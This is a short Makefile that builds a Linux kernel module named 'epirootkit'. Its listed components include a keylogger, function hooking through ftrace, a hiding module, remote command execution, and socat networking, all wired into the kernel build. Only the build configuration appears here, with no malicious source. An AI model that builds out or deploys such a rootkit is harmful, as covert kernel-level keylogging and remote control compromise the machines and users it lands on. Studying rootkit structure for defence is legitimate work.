KERNELDIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
obj-m = epirootkit.o
epirootkit-objs = main.o network.o exec_cmd.o socat.o \
					file_ops.o keylogger.o ftrace.o hooks.o hider.o \
					rootkit_command.o

modules: $(mult-objs)
	@./generate_socat_h.sh
	$(MAKE) -C $(KERNELDIR) M=$(PWD) $@ $^
clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) $@